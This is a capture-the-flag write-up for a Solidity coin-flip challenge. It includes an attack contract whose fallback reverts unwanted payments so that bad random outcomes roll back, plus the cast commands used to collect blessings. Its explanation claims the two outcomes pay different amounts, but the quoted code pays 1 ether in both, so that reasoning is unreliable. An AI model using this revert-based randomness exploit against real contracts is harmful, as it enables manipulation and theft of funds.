## Contract

This contract simulates a coin-flip-like game with an angel (?).

Our goal is to satisfy the `isSolved()` condition. To do that, we need to call this function:
```solidity
function ascend() public payable {
        require(blessings[msg.sender] >= 10,"You have not proved your worthiness :((");
        solved = true;
    }
```

To get 10 blessings, we look at this part of the code:
```solidity
function Blessing() public payable {
    require(msg.value == 1 ether, "You must pay the right to get your blessing");
    uint256 randomNumber = uint256(keccak256(abi.encodePacked(seed, msg.sender, block.prevrandao, block.timestamp)));
    uint256 AngelNumber = randomNumber % 2;

    if (AngelNumber == 1) {
        (bool sent, ) = msg.sender.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");
        blessings[msg.sender] += 1;
    }

    if (AngelNumber == 0) {
        (bool sent, ) = msg.sender.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");
        blessings[msg.sender] = 0;
    }
}
```
It computes a "random" value we do not know. Depending on that value, it sends us a transaction containing 0 or 1 ether, then either adds one blessing or removes all of them.

## Solution

A simple way to keep only favorable outcomes is to avoid ever reaching `blessings[msg.sender] = 0;`. For that, we can use a small trick: reject any fund transfer that is not equal to 1 ether.

But how do we do that, K.L.M?

Like this:
```solidity
fallback() payable external{
        if (msg.value != 1 ether){
            revert();
        }
    }
```

Now we write an attack contract, available in the folder as `attack.sol`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface mysticalAngel{
     function Blessing() external payable;
     function ascend() external payable;
}

contract Attack {

    mysticalAngel public angel;

    function setTarget(address _angel) public {
        angel = mysticalAngel(_angel);
    }

    function attack() public payable {
        angel.Blessing{value: 1 ether}();
    }

    function win() public {
        angel.ascend();
    }


    fallback() payable external{
        if (msg.value != 1 ether){
            revert();
        }
    }
}
```

Now all that remains is to deploy it, export our environment variables (`$ATK` = attack contract address, `$TAR` = target contract address, `$PK` = private key, `$RPC` = RPC URL), and run the following commands:

```bash
cast send $ATK "setTarget(address)" $TAR -r $RPC --private-key $PK
cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether # send 1 ether to the contract so we can call the function; if it fails, retry.

cast b $ATK -r $RPC # for example, here it did not work.
0

cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether
cast b $ATK -r $RPC
1000000000000000000 # it worked

cast send $ATK "attack()" -r $RPC --private-key $PK # repeat as many times as needed

cast call $TAR "blessings(address)(uint256)" $ATK -r $RPC
13 # greater than 10, we are good!
```

Win!
We then retrieve our flag on the platform.
